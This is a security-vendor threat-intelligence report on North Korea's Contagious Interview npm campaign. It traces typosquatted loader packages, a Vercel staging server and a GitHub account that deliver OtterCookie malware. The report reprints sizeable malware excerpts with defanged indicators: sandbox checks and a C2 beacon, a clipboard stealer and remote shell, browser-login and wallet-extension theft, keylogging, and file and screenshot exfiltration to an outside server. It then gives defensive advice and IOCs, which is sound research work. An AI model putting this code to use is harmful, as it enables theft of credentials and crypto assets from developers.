---
title: "Inside the GitHub Infrastructure Powering North Korea's Contagious Interview npm Attacks"
short_title: "Inside North Korea's Contagious Interview npm Attacks"
date: 2025-11-26 12:00:00 +0000
categories: [Malware, North Korea]
tags: [North Korea, Contagious Interview, OtterCookie, BeaverTail, npm, Supply Chain Security, Typosquatting, Infostealer, Keylogger, GitHub, Vercel, Web3, Threat Intelligence, T1583.001, T1583.006, T1585, T1587, T1587.001, T1608.001, T1195.002, T1059.007, T1204.002, T1204.005, T1547.001, T1546.016, T1036, T1497, T1656, T1056.001, T1539, T1555.001, T1555.003, T1082, T1083, T1217, T1005, T1113, T1115, T1119, T1105, T1571, T1041, T1657]
description: "Socket Threat Research Team maps a rare inside look at OtterCookie's npm-Vercel-GitHub chain, adding 197 malicious packages and evidence of North Korea's Contagious Interview operation."
toc: true
canonical_url: https://socket.dev/blog/north-korea-contagious-interview-npm-attacks
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/6ebe122c6237ac481b6d5d8f61544d160d503868-1024x1024.png?w=1600&q=95&fit=max&auto=format
  alt: North Korea Contagious Interview npm attacks artwork
---

The Socket Threat Research Team continues to track North Korea's Contagious Interview operation as it systematically infiltrates the npm ecosystem. Since we last [reported](https://socket.dev/blog/north-korea-contagious-interview-campaign-338-malicious-npm-packages) on this campaign, it has added at least 197 more malicious npm packages and over 31,000 additional downloads, with state-sponsored threat actors targeting blockchain and Web3 developers through fake job interviews and "test assignments". This sustained tempo makes Contagious Interview one of the most prolific campaigns exploiting npm, and it shows how thoroughly North Korean threat actors have adapted their tooling to modern JavaScript and crypto-centric development workflows.

Within this recent wave of malicious npm packages, we documented a rare inside view of the GitHub infrastructure that underpins part of this activity. Tracing the malicious npm package [`tailwind-magic`](https://socket.dev/npm/package/tailwind-magic/overview/3.3.1) led us to a Vercel-hosted staging endpoint, `tetrismic[.]vercel[.]app`, and from there to a threat actor-controlled GitHub account, `stardev0914`, which contained 18 repositories. We credit Kieran Miyamoto of the DPRK Research blog ([https://dprk-research.kmsec.uk/](https://dprk-research.kmsec.uk/)), whose observation about a related GitHub repository helped confirm and refine our pivot to this account.

![](https://cdn.sanity.io/images/cgdhsj6q/production/5e87e8cae262b1f87fc6cefa7d71bb1ea5ce6754-1104x588.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious `tailwind-magic` npm package highlights security issues, including inconsistent metadata, and a hardcoded link to the GitHub repository `https://github[.]com/stardev0914/tailwind-magic.git`._

The repositories in the `stardev0914` GitHub account form a coherent adversarial delivery stack: malware-serving code lives on GitHub, the latest payload is fetched from Vercel, and a separate command and control (C2) server handles data collection and tasking. At least five malicious npm packages, including [`tailwind-magic`](https://socket.dev/npm/package/tailwind-magic/overview/3.3.1), [`tailwind-node`](https://socket.dev/npm/package/tailwind-node/overview/0.0.1-security), [`node-tailwind`](https://socket.dev/npm/package/node-tailwind/overview/2.1.3), [`node-tailwind-magic`](https://socket.dev/npm/package/node-tailwind-magic), and [`react-modal-select`](https://socket.dev/npm/package/react-modal-select/overview/1.0.0), rely on this infrastructure to deliver a second-stage payload.

![](https://cdn.sanity.io/images/cgdhsj6q/production/be956d43589e1adc8c3e206715557ed453e53e68-1724x268.png?w=1600&q=95&fit=max&auto=format)
_Diagram of the analyzed Contagious Interview attack chain: a victim installs a malicious npm package that fetches a payload from a hardcoded Vercel URL, which in turn pulls code from a threat actor-controlled GitHub repository and executes the OtterCookie malware, establishing bidirectional C2 with the threat actor's server for data theft and remote tasking._

The payload itself is a recent OtterCookie malware variant that blurs earlier distinctions between OtterCookie and [BeaverTail](https://socket.dev/blog/north-korean-apt-lazarus-targets-developers-with-malicious-npm-package). Once delivered, it performs VM and sandbox detection, fingerprints the host, and then establishes a long-lived C2 channel. From there it provides the threat actors with a remote shell, continuous clipboard theft, global keylogging, multi-monitor screenshot capture, and recursive filesystem scanning designed to harvest credentials, seed phrases, wallet data, and sensitive documents. It also targets Chrome and Brave profile data and a broad set of popular crypto-wallet browser extensions across Windows, macOS, and Linux, making it a combined infostealer and remote access tool tuned for draining digital assets and exfiltrating high-value secrets from developer systems.

Our analysis of the `stardev0914` account also uncovered a constellation of repositories that act as delivery vehicles and lures. A repository named `tailwind-magic` mirrors the malicious npm [package](https://socket.dev/npm/package/tailwind-magic/overview/3.3.1) and serves as a typosquatted fork of the legitimate [`tailwind-merge`](https://socket.dev/npm/package/tailwind-merge) library, modified to act as a loader for the payload staged at `tetrismic[.]vercel[.]app`. In addition, we analyzed repositories named after crypto-themed projects, including a cloned Knightsbridge DEX front-end (`dexproject`) wired to the malicious [`node-tailwind`](https://socket.dev/npm/package/node-tailwind/overview/2.1.3) package, as well as numerous token- and DeFi-branded repositories used as lures.

![](https://cdn.sanity.io/images/cgdhsj6q/production/26994d7c37c9538db0efa80dc3c06aee14346840-954x965.png?w=1600&q=95&fit=max&auto=format)
_Annotated GitHub view of the threat actor-controlled account `stardev0914`, highlighting some of the repositories: `dexproject` (cloned Knightsbridge DEX with malicious npm dependency), `tetrismic` (malware server delivering OtterCookie), several fake token lure sites (`safutoken`, `laifubnb`, `spurdomeme`), and `tailwind-magic`, a malware loader._

GitHub hosts polished but malicious or deceptive crypto projects, npm delivers loader packages that appear to be harmless utilities, Vercel stages the latest payload, and a separate C2 server quietly runs OtterCookie malware against compromised hosts. In this most recent wave of 197 packages since [October 10, 2025](https://socket.dev/blog/north-korea-contagious-interview-campaign-338-malicious-npm-packages), we confirmed that 15 malicious npm packages remain live at the time of writing and have reported them to the npm security team for blocking. Even though the `stardev0914` account has been removed, the Contagious Interview campaign's techniques persist and continue to evolve, with new npm infiltrations appearing weekly as North Korean operators bombard developers and tech job seekers with supply chain malware such as the OtterCookie family analyzed in this report.

## Malicious npm Package

[`tailwind-magic`](https://socket.dev/npm/package/tailwind-magic/overview/3.3.1) is a typosquatted and backdoored clone of the legitimate [`tailwind-merge`](https://socket.dev/npm/package/tailwind-merge/overview/3.4.0) library. The code exported from `dist/` behaves like a normal Tailwind class-merging utility, but a `postinstall` script executes [`src/lib/index.js`](https://socket.dev/npm/package/tailwind-magic/files/3.3.1/src/lib/index.js), which uses `axios` to call the threat actor-controlled endpoint `https://tetrismic[.]vercel[.]app/api/ipcheck` and `eval` the returned JavaScript. This behavior turns the package into a remote loader that runs threat actor-supplied code at install time.

![](https://cdn.sanity.io/images/cgdhsj6q/production/9d86d3e762e13d84f54307fa385654e87e0f013e-620x649.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious `tailwind-magic` package highlights a backdoor that, on import, POSTs the local package version to the threat-actor endpoint `https://tetrismic[.]vercel[.]app/api/ipcheck` and `eval`s the response, granting the threat actor arbitrary code execution with full Node.js process privileges._

## Staging Server

The threat actors maintain a small staging server, developed in the GitHub repository `github[.]com/stardev0914/tetrismic` and deployed on Vercel at `tetrismic[.]vercel[.]app`. On each request, the server reads its local `main.js` payload and returns its contents in a JSON field named `model`. The malicious npm package extracts this field and executes it with `eval()` inside the victim's Node.js process, turning the payload into live code on the host.

The threat actors split this infrastructure into three components. GitHub hosts the development repository. Vercel serves the current payload on demand. A separate C2 server receives data and issues tasks once the loader runs, which isolates operations. The npm package is the delivery vehicle that bridges developer environments and this backend. This separation lets the threat actors rotate payloads across multiple packages, customize responses per target, and keep their C2 infrastructure relatively quiet until the second stage is active.

![](https://cdn.sanity.io/images/cgdhsj6q/production/bc3581bba00a3f721861f156612aac92d075cd3f-1109x921.png?w=1600&q=95&fit=max&auto=format)
_GitHub Deployments view for the threat actor repository `stardev0914/tetrismic` (when it was live), showing 38 Vercel "Production" deployments used to continuously update the OtterCookie staging server that malicious npm loaders such as `tailwind-magic` query for their current JavaScript payload._

## OtterCookie Malware Payload

The payload aligns with what NTT Security Japan SOC analysts Masaya Motoda and Rintaro Koike [describe](https://jp.security.ntt/insights_resources/tech_blog/contagious-interview-ottercookie/) as OtterCookie version 4 in their excellent reporting. It also reflects the sharp analysis by Cisco Talos researchers Vanja Švajcer and Michael Kelley, who [documented](https://blog.talosintelligence.com/beavertail-and-ottercookie/) overlapping traits across BeaverTail and OtterCookie, blurring the boundary between the two malware families.

At a high level, the OtterCookie sample in this campaign operates as a multi-stage infostealer and remote access trojan (RAT) with capabilities including:

- VM and sandbox checks plus host fingerprinting
- C2 connection to register the infected host and request tasks
- Interactive remote shell
- Clipboard data exfiltration
- System-wide keylogging
- Multi-monitor screenshot capture
- Recursive file-system search for secrets, wallets, and sensitive documents
- Collection of browser credentials and wallet extension data from Chrome and Brave on Windows, macOS, and Linux

## VM and Sandbox Detection; Initial C2 Beacon

The OtterCookie uses the `setHeader()` function to profile the host for virtualization before sending its first request to the C2 server. The code snippets in this section and below are taken directly from the threat actor-controlled `stardev0914` GitHub repository, with indicators defanged and inline comments added by Socket for clarity.

`setHeader()` implements VM and sandbox checks:

- **Windows:** executes `wmic computersystem get model,manufacturer` and flags systems whose output contains `vmware`, `virtualbox`, `microsoft corporation`, or `qemu`
- **macOS:** runs `system_profiler SPHardwareDataType` and scans the hardware profile for common virtualization vendors
- **Linux:** parses `/proc/cpuinfo` for hypervisor strings such as `vmware`, `virtualbox`, `kvm`, or `xen`

These checks help the malware avoid analyst sandboxes and prioritize victim environments before it beacons out.

```javascript
// VM, sandbox check, and initial C2 beacon
const setHeader = async function () {
  try {
    let isVM = false;

    if (os.platform() == "win32") {

      // Windows: check model/manufacturer for VM vendors
      let output = execSync("wmic computersystem get model,manufacturer", { windowsHide: true });
      output = output.toString().toLowerCase();
      if (output.includes("vmware") ||
          output.includes("virtualbox") ||
          output.includes("microsoft corporation") ||
          output.includes("qemu")) {
        isVM = true;
      }

    } else if (os.platform() == "darwin") {

      // macOS: inspect hardware profile for virtualization markers
      let output = execSync("system_profiler SPHardwareDataType", { windowsHide: true });
      output = output.toString().toLowerCase();
      if (/vmware|virtualbox|qemu|parallels|virtual/i.test(output)) isVM = true;

    } else if (os.platform() == "linux") {

      // Linux: scan /proc/cpuinfo for hypervisor strings
      let output = fs.readFileSync("/proc/cpuinfo", "utf8").toLowerCase();
      if (/hypervisor|vmware|virtio|kvm|qemu|xen/i.test(output)) isVM = true;
    }

    // Send host fingerprint and VM flag to C2
    const result = await axios.post(
      "http://144[.]172[.]104[.]117:5918/api/service/process/" + uid,
      {
        OS:       os.type(),
        platform: os.platform(),
        release:  os.release() + (isVM ? " (VM)" : " (Local)"),
        host:     os.hostname(),
        userinfo: os.userInfo(),
        uid,
        t: 66
      }
    );

    // C2 tells client to stop if flagged as VM
    if (result.data && result.data.release.includes("(VM)")) {
      return false;
    } else {
      return true;
    }

  } catch (e) {
    console.log(e.message);
    return true;
  }
}
```

## Payload Orchestration

Once the environment checks pass, the malware hands execution to `main()`, which coordinates the long-running payload components. `main()` first calls `setHeader()`; if the C2 response or VM checks indicate a sandbox, it exits, otherwise it invokes `s()`, which in turn launches three asynchronous workers: `ss()`, `aa()`, and `bb()`.

- `ss()` — clipboard theft, interactive remote shell, and persistence
- `aa()` — browser credential collection and wallet extension data theft
- `bb()` — keylogging, screenshot capture, and filesystem scanning / exfiltration

Each worker runs as a separate, detached Node.js process spawned via `child_process.spawn('node', ['-e', code], { detached: true, stdio: 'ignore', windowsHide: true })` and then `unref()`ed, so these processes continue running in the background even after the initial loader exits.

## Clipboard Theft, Interactive Remote Shell, and Windows Persistence

`ss()` builds a hex-escaped payload string, decodes it, and executes it in a detached Node.js process:

```javascript
// Excerpt from ss(): clipboard stealer and remote command backdoor
// Every 5s: read clipboard and POST { uid, clip, hostname } to /clip
// Every 10s: poll /command?uid=<uid>, exec returned command, POST { uid, command, output, hostname } to /output

const axios = require("axios");
const os = require("os");
const fs = require("fs");
const {spawn, execSync} = require("child_process");
const uid = "4a3703430a2ec2ae30f362b29e994f77";

setInterval(() => {
  let clip;
  const hostname = os.hostname();

  // OS-specific clipboard read
  if (os.platform() === "win32") {
    clip = execSync("powershell -command Get-Clipboard", { encoding: "utf8", windowsHide: true });
  } else if (os.platform() === "darwin") {
    clip = execSync("pbpaste", { encoding: "utf8" });
  } else {
    clip = execSync("xclip -selection clipboard -o", { encoding: "utf8", windowsHide: true });
  }

  // Clipboard exfiltration: /clip endpoint
  axios.post(`http://${a}.${b}.${c}.${d}:${p}/clip`, { uid, clip, hostname })
       .catch(err => console.error("Clipboard post error:", err.message));
}, 5000); // 5 seconds

setInterval(async () => {
  try {

    // Poll C2 for commands for this uid
    const response = await axios.get(`http://${a}.${b}.${c}.${d}:${p}/command?uid=` + uid);
    const command = response.data.command;

    if (command) {
      let output;
      const hostname = os.hostname();

      // Execute arbitrary command from C2
      try {
        output = execSync(command, { encoding: "utf8", windowsHide: true });
      } catch (err) {
        output = "Error executing command: " + err.message;
      }

      // Send command output back to C2
      await axios.post(
        `http://${a}.${b}.${c}.${d}:${p}/output`,
        { uid, command, output, hostname }
      );
    }
  } catch (err) {
    console.error("Remote shell error:", err.message);
  }
}, 10000); // 10 seconds
```

It also establishes persistence on Windows:

- Adds a `Run` entry `HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "NodeHelper"`
- Creates a scheduled task `NodeUpdate` to run `node <dir>\\index.js` at logon with highest privileges

Together, these mechanisms provide a persistent backdoor on compromised Windows hosts.

## Browser and Wallet Credential Theft

`aa()` constructs the following Node.js payload and runs it in a separate process:

```javascript
const os = require('os');
const fs = require('fs');
const path = require('path');
const sqlite3 = require('sqlite3').verbose();
const FormData = require('form-data');
const axios = require('axios');

// C2 endpoints for browser data exfiltration
const uploadUrl = "http://144[.]172[.]104[.]117:5918/upload";
const uu        = "http://144[.]172[.]104[.]117:5918/total";
let i           = <current counter>;

const getBasePaths = () => {
  const platform = process.platform;
  if (platform === "win32") {
    return [
      path.join(process.env.LOCALAPPDATA, "Google/Chrome/User Data"),
      path.join(process.env.LOCALAPPDATA, "BraveSoftware/Brave-Browser/User Data"),
    ];
  } else if (platform === "darwin") {
    return [
      path.join(process.env.HOME, "Library/Application Support/Google/Chrome"),
      path.join(process.env.HOME, "Library/Application Support/BraveSoftware/Brave-Browser"),
    ];
  } else if (platform === "linux") {
    return [
      path.join(process.env.HOME, ".config/google-chrome"),
      path.join(process.env.HOME, ".config/BraveSoftware/Brave-Browser"),
    ];
  }
  return [];
};
```

Targeted wallet extension IDs:

```javascript
const wps = [
  "acmacodkjbdgmoleebolmdjonilkdbch", // Keplr
  "nkbihfbeogaeaoehlefnkodbefgpgknn", // MetaMask
  "bfnaelmomeimhlpmgjnjophhpkkoljpa", // Phantom
  "ibnejdfjmmkpcnlpebklmnkoeoihofec", // Binance Chain
  "ppbibelpcjmhbdihakflkdcoccbgbkpo", // Core Wallet
  "omaabbefbmiijedngplfjmnooppbclkk", // Tonkeeper
  "egjidjbpglichdcondbcbdnbeeppgdph", // Trust
  "khpkpbbcccdmmclmpigdgddabeilkdpd", // XDEFI
  "dmkamcknogkgcdfhhbddcghachkejeap", // Brave
  "ejbalbakoplchlghecdalmeeeajnimhm", // Bitget
  "fhbohimaelbohpjbbldcngcnapndodjp", // MetaMask Beta
  "aeachknmefphepccionboohckonoeemg", // Ronin
  "hifafgmccdpekplomjjkcfgodnhcellj", // Terra
  "jblndlipeogpafnldhgmapagcccfchpi", // Nami
  "dlcobpjiigpikoobohmabehhmhfoodbb", // Solflare
  "mcohilncbfahbmgdjkbpemcciiolgcge", // Binance
  "agoakfejjabomempkjlepdflaleeobhb", // Martian
  "aholpfdialjgjfhomihkjbmgioiodbic", // Petra
  "nphplpgoakhhjchkkhmiggakijnkhfnd", // Safepal
  "penjlddjkjgpnkllboccdgccekpkcbin", // Suiet
  "lgmpcpglpngdoalbgeoldeajfclnhafa", // Fewcha
  "fldfpgipfncgndfolcbkdeeknbbbnhcc", // Clover
  "bhhhlbepdkbapadjdnnojkbgioiodbic", // Pontem
  "gjnckgkfmgmibbkoficdidcljeaaaheg", // Unisat
  "afbcbjpbpfadlkmhmclhkeeodmamcflc", // WalletConnect
  "bdgmdoedahdcjmpmifafdhnffjinddgc", // Bittensor
  "hnfanknocfeofbddgcijnmhnfnkdnaad", // Coinbase
  "acmacodkjbdgmoleebolmdjonilkdbch", // Rabby (duplicate ID)
];
```

Browser logins:

```javascript
// Extract stored Chrome/Brave login entries from a profile path
const extractBrowserData = (profilePath) => {

  // SQLite DB file holding saved logins for this profile
  const loginDataPath = path.join(profilePath, 'Login Data');
  const extractedData = [];

  // No credential DB for this profile
  if (!fs.existsSync(loginDataPath)) return extractedData;

  // Open browser login database in read-only mode
  const db = new sqlite3.Database(loginDataPath, sqlite3.OPEN_READONLY, ...);

  return new Promise((resolve) => {

    // Pull url / username / password blobs from the logins table
    db.all('SELECT origin_url, username_value, password_value FROM logins',
      (err, rows) => {
        if (!err) {
          rows.forEach(row => {
            extractedData.push({
              url:      row.origin_url,
              username: row.username_value,
              password: row.password_value
            });
          });
        }
        db.close();
        resolve(extractedData);
      }
    );
  });
};
```

Once the npm loader `eval`s `main.js` on the victim, the script immediately communicates to C2 and initializes the core payload modules. It:

1. Registers the host and sends a full fingerprint to `http://144[.]172[.]104[.]117:5918/api/service/process/{uid}`.
2. If the C2 response allows execution, launches three parallel modules: clipboard stealer and interactive remote shell; keylogger, screenshot capture, and recursive secret/file search; and Chrome/Brave credential theft and wallet extension data exfiltration.

All C2 traffic goes to `144[.]172[.]104[.]117`.

## Keylogger, Screenshots, Filesystem Scan, and Mass Exfiltration

`bb()` constructs another Node.js payload and launches it in a separate, detached process:

```javascript
const fs    = require('fs');
const path  = require('path');
const axios = require('axios');
const os    = require('os');

// Global counters and flags for this module
let screenshotCounter = 0;
let totalFiles        = 0;
let listenerAdded     = false;

// Filename patterns used to hunt secrets, wallets, and sensitive documents
const searchKey = [
  "*.env*", "*metamask*", "*phantom*", "*bitcoin*", "*trust*",
  "*phrase*", "*secret*", "*phase*", "*credential*", "*account*", "*mnemonic*",
  "*seed*", "*recovery*", "*backup*", "*address*", "*keypair*", "*wallet*",
  "*my*", "*screenshot*",
  "*.doc*", "*.docx*", "*.pdf*", "*.rtf*", "*.odt*",
  "*.xls*", "*.xlsx*", "*.txt*", "*.ini*", "*.secret*", "*.json*", "*.ts*",
  "*.js*", "*.csv*"
];

// Directories and system files to skip during recursive search
const excludeFolders = [
  'node_modules','Windows','Program Files','Program Files (x86)',
  'System Volume Information','$Recycle.Bin','AppData','.cache',
  'Recovery','pagefile.sys','hiberfil.sys','swapfile.sys','Thumbs.db',
  // and many more (directories, system files) not included in this code snippet
];

// Case-insensitive match against simple *substring* patterns
const isFileMatching = (fileName) => {
  const lowerFileName = fileName.toLowerCase();
  return searchKey.some(pattern => {
    const lowerPattern = pattern.toLowerCase();
    if (lowerPattern.startsWith('*') && lowerPattern.endsWith('*')) {
      const core = lowerPattern.slice(1, -1);
      return lowerFileName.includes(core);
    }
  });
};

// Delay initialization of keylogging, screenshot, file-search module
setTimeout(() => {
  try {

    // Load keylogging, screenshot, image, and upload helpers
    const GlobalKeyboardListener = require("module-listener").GlobalKeyboardListener;
    const { Monitor }            = require("node-screenshots");
    const sharp                  = require("sharp");
    const FormData               = require("form-data");

    const keyStates = {};
    let capsLock    = false;
    const tmpDir    = os.tmpdir();
    const keyboard  = new GlobalKeyboardListener();
    let text        = "";
    let shift       = false;
    let ctrl        = false;
    let isRunning   = true;

    const uu = "http://144[.]172[.]104[.]117:5918/total";
    // C2 endpoint for transfer
```

This scans entire disks / mount points looking for files whose names look like secrets, wallets, sensitive documents, configs, etc., and uploads matching files to `/total`.

Keylogger:

```javascript
const sendKeyText = async () => {
  if (text.trim() === "") return;
  const form = new FormData();
  form.append("text", text);
  await axios.post(uu, form, {
    headers: {
      ...form.getHeaders(),
      userkey: 1995,
      hostname: os.hostname(),
      t: "66"
    }
  });
  text = "";
};

const addKeyboardListener = () => {
  if (listenerAdded) return;
  listenerAdded = true;

  keyboard.addListener(function (e, down) {
    if (!isRunning) return;
    // Tracks shift/ctrl/caps lock etc, builds readable string
    // Calls sendKeyText() on ENTER / LBUTTON etc.
  });
};
```

It uses `GlobalKeyboardListener` from `module-listener` / `node-global-key-listener` to capture system-wide keystrokes and periodically send them to `http://144[.]172[.]104[.]117:5918/total` with `userkey: 1995` and the host name in HTTP headers.

Filesystem crawler and file exfiltration:

```javascript
const uf = async (p) => {

  // Upload a single file to C2 as multipart / form-data
  if (fs.statSync(p).isFile()) {
    const form = new FormData();
    form.append("file", fs.createReadStream(p));

    await axios.post(uu, form, {
      headers: {
        ...form.getHeaders(),
        userkey: 1995,           // Static implant ID
        hostname: os.hostname(), // Host identifier
        t: "66"                  // Fixed campaign/tag value for this implant
      }
    });
  }
};

const scanDir = async (dir) => {
  // Recursively walk dir, skip excludeFolders, and exfil matching files
};

const scanFullSystem = async () => {
  const rootDrives = [];

  if (process.platform === 'win32') {
    // Enumerate existing drive letters A:\ .. Z:\
    // and treat each as a root for scanning
  } else {

    // Unix-like: scan / plus common mount points
    rootDrives.push('/');
    const mounts = ['/mnt', '/media', '/Volumes', '/home'];
    mounts.forEach(m => fs.existsSync(m) && rootDrives.push(m));
  }

  // Traverse each root and apply recursive file search and upload
  for (const root of rootDrives) await scanDir(root);
};
```

Screenshots:

```javascript
const captureScreenshots = async () => {
  const monitors = await Monitor.getAllDisplays();
  // Enumerate all attached displays

  // Grab per-monitor frames and merge into a single composite image buffer
  const screenshotPath = path.join(tmpDir, 'screenshots', `screenshot${screenshotCounter++}.jpeg`);
  fs.writeFileSync(screenshotPath, combinedImage);
  // Write composite JPEG to temp folder

  await uf(screenshotPath); // Exfil combined screenshot via upload endpoint
};
```

The module performs continuous keylogging, multi-monitor screenshot capture, and large-scale file exfiltration across the compromised system.

## Crypto-Themed Repositories Used for Malicious Delivery and Lures

### Repository `dexproject`

Contagious Interview threat actors used the `dexproject` repository in their `stardev0914` GitHub account as a carrier for the malicious npm package [`node-tailwind`](https://socket.dev/npm/package/node-tailwind/overview/2.1.3). The repository presents as a standard DEX front-end template: the application code looks normal, but installing its dependencies pulls in a malicious package.

![](https://cdn.sanity.io/images/cgdhsj6q/production/b0d476b37ba9c53fcf4a81f934b12b0240b0efaa-1426x458.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious `node-tailwind` package highlights its supply-chain risk, flagging it as known malware with 0% supply chain security and unstable ownership (a new collaborator publishing versions). At the time of writing, this package remains live on npm, but we have reported it to the npm security team for blocking._

`dexproject` is a cloned Knightsbridge site and effectively a Knightsbridge/KXCO-branded DEX front-end wired to `node-tailwind`, so it looks like a legitimate Knightsbridge DEX while acting as a supply chain delivery vehicle. The branding and metadata masquarade as "Knightsbridge DEX / KXCO", with clear copy-paste artifacts and deployment to `knightsbridge-dex[.]vercel[.]app`, but the UI is purely presentational: buttons do not invoke contracts, and the source contains no router or factory addresses.

The key malicious element is the `node-tailwind` npm package. Instead of using a standard utility such as `tailwind-merge`, the project imports `node-tailwind` into a `cn()` helper in `src/lib/utils.ts` and then calls `cn()` for `className` construction across the component tree, ensuring the malicious dependency is loaded and executed wherever the template is used.

```javascript
// src/lib/utils.ts
import { clsx } from "clsx";
// Malicious helper imports backdoored node-tailwind package

import { nodeTailwind } from "node-tailwind";

export function cn(...inputs: ClassValue[]) {
  // Wrap clsx output so all class merging flows through nodeTailwind (malicious hook point)
  return nodeTailwind(clsx(inputs));
}
```

![](https://cdn.sanity.io/images/cgdhsj6q/production/76fa33ea23ad769494668e34b7101319bd25ae89-1600x1200.png?w=1600&q=95&fit=max&auto=format)
_Screenshot of the Knightsbridge/KXCO-branded DEX front end hosted at `knightsbridge-dex[.]vercel[.]app`, which Contagious Interview threat actors cloned and used as a presentational lure while wiring the underlying template to the malicious `node-tailwind` npm dependency._

### Repository `tailwind-magic`

The `tailwind-magic` repository backs a malicious namesake npm [package](https://socket.dev/npm/package/tailwind-magic/overview/3.3.1) that typosquats and impersonates the legitimate `tailwind-merge` library. The exported API behaves like a normal Tailwind class-merging helper so it blends into existing React and Vite workflows.

The package's main module ([`index.js`](https://socket.dev/npm/package/tailwind-magic/files/3.3.1/src/lib/index.js)) embeds an import-time loader that runs automatically whenever the package is loaded, contacts `tetrismic[.]vercel[.]app`, and executes the JavaScript returned by the server. In practice, this turns [`tailwind-magic`](https://socket.dev/npm/package/tailwind-magic/overview/3.3.1) into a remote loader for the `tetrismic` C2-hosted OtterCookie malware: any project that imports the package executes threat actor-controlled code with full Node.js privileges.

Other repositories in the `stardev0914` account serve primarily as bait. They give the Contagious Interview threat actors plausible GitHub projects and live demo sites to showcase in a fake portfolio. A recruiter persona can point targets to these repositories with instructions like "here's the project our team is building; please make a small change to it", turning otherwise benign-looking templates into delivery vectors for malware.

## Outlook and Recommendations

This wave reinforces Contagious Interview as a systematic, factory-style operation that treats npm, GitHub, and Vercel as a combined, renewable initial access channel. In this latest cluster, we observed a full stack: multiple loader packages, a Vercel-hosted stager, and a threat actor-controlled GitHub account serving OtterCookie malware.

Since [October 10, 2025](https://socket.dev/blog/north-korea-contagious-interview-campaign-338-malicious-npm-packages), the campaign has pushed 197 more malicious packages. Even though the `stardev0914` account has been removed, the threat actors' techniques are intact and already reappearing in new accounts, with fresh npm infiltrations emerging weekly.

Defenders should harden the specific points where this campaign succeeds:

- Treat every `npm install` as remote code execution.
- Lock down CI runners and build agents so they do not have direct access to production keys and secrets, wallets and signing keys, or cloud administration interfaces.
- Apply network egress controls to block build-time connections to unexpected hosts.
- Require code review for new templates pulled from GitHub, especially in Web3 and DeFi contexts.
- Scrutinize non-standard utility packages wired into global helpers that are used across the codebase.
- Pin dependency versions and use lockfiles, and avoid unpinned, auto-updating dependencies wherever possible.

Organizations should also integrate automated package analysis into their development workflow. Run real-time PR and dependency scanning to catch behaviors such as import-time loaders, `eval` on network responses, cross-platform keyloggers, and bulk filesystem exfiltration before these behaviors ever land on developer machines or CI systems.

Done well, this turns code review and dependency onboarding into enforcement points where Contagious Interview-style campaigns can be stopped long before malware executes in builds or wallets, especially when combined with automated tooling.

Socket's [**GitHub App**](https://socket.dev/features/github) inspects dependencies during review, while the [**Socket CLI**](https://socket.dev/features/cli) applies behavior-level checks at install time. [**Socket Firewall**](https://socket.dev/blog/introducing-socket-firewall) blocks known malicious packages before the package manager fetches them, including transitive dependencies, by mediating dependency requests. The [**Socket browser extension**](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) warns developers about suspicious packages while they browse registries, and [**Socket MCP**](https://socket.dev/blog/socket-mcp) extends similar protections into AI-assisted coding by detecting and flagging malicious or hallucinated packages in LLM suggestions.

## MITRE ATT&CK

- T1583.001 — Acquire Infrastructure: Domains
- T1583.006 — Acquire Infrastructure: Web Services
- T1585 — Establish Accounts
- T1587 — Develop Capabilities
- T1587.001 — Develop Capabilities: Malware
- T1608.001 — Stage Capabilities: Upload Malware
- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1204.002 — User Execution: Malicious File
- T1204.005 — User Execution: Malicious Library
- T1547.001 — Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
- T1546.016 — Event Triggered Execution: Installer Packages
- T1036 — Masquerading
- T1497 — Virtualization/Sandbox Evasion
- T1656 — Impersonation
- T1056.001 — Input Capture: Keylogging
- T1539 — Steal Web Session Cookie
- T1555.001 — Credentials from Password Stores: Keychain
- T1555.003 — Credentials from Password Stores: Credentials from Web Browsers
- T1082 — System Information Discovery
- T1083 — File and Directory Discovery
- T1217 — Browser Information Discovery
- T1005 — Data from Local System
- T1113 — Screen Capture
- T1115 — Clipboard Data
- T1119 — Automated Collection
- T1105 — Ingress Tool Transfer
- T1571 — Non-Standard Port
- T1041 — Exfiltration Over C2 Channel
- T1657 — Financial Theft

## Indicators of Compromise (IOCs)

### Malicious npm Packages Linked to Tetrismic C2

1. [`tailwind-magic`](https://socket.dev/npm/package/tailwind-magic/overview/3.3.1)
2. [`tailwind-node`](https://socket.dev/npm/package/tailwind-node/overview/0.0.1-security)
3. [`node-tailwind`](https://socket.dev/npm/package/node-tailwind/overview/2.1.3)
4. [`node-tailwind-magic`](https://socket.dev/npm/package/node-tailwind-magic)
5. [`react-modal-select`](https://socket.dev/npm/package/react-modal-select/overview/1.0.0)

### GitHub Account

- `github[.]com/stardev0914`

### stardev0914 GitHub Repositories

1. `tetrismic`
2. `tailwind-magic`
3. `dexproject`
4. `etherchainai`
5. `snortertoken`
6. `protocolai`
7. `pepeheimer`
8. `futuresyncx`
9. `captainpepe`
10. `safutoken`
11. `laifubnb`
12. `spurdomeme`
13. `aptober`
14. `snoopybnb.wtf`
15. `stakesnoopy.wtf`
16. `claim.snoopybnb.wtf`
17. `agent.snoopybnb.wtf`
18. `bestwallet`

### C2 Infrastructure

- `tetrismic[.]vercel[.]app`
- `https://tetrismic[.]vercel[.]app/api/ipcheck`
- `knightsbridge-dex[.]vercel[.]app`
- `144[.]172[.]104[.]117`
- `144[.]172[.]104[.]117:5918`
- `http://144[.]172[.]104[.]117:5918/api/service/process`
- `http://144[.]172[.]104[.]117:5918/command`
- `http://144[.]172[.]104[.]117:5918/output`
- `http://144[.]172[.]104[.]117:5918/clip`
- `http://144[.]172[.]104[.]117:5918/total`
- `http://144[.]172[.]104[.]117:5918/upload`

### Malicious npm Packages Since [October 10, 2025](https://socket.dev/blog/north-korea-contagious-interview-campaign-338-malicious-npm-packages)

1. [`assert-json-not`](https://socket.dev/npm/package/assert-json-not)
2. [`auth-handler`](https://socket.dev/npm/package/auth-handler)
3. [`bcrypt-js-edge`](https://socket.dev/npm/package/bcrypt-js-edge)
4. [`bcryptjs-node`](https://socket.dev/npm/package/bcryptjs-node)
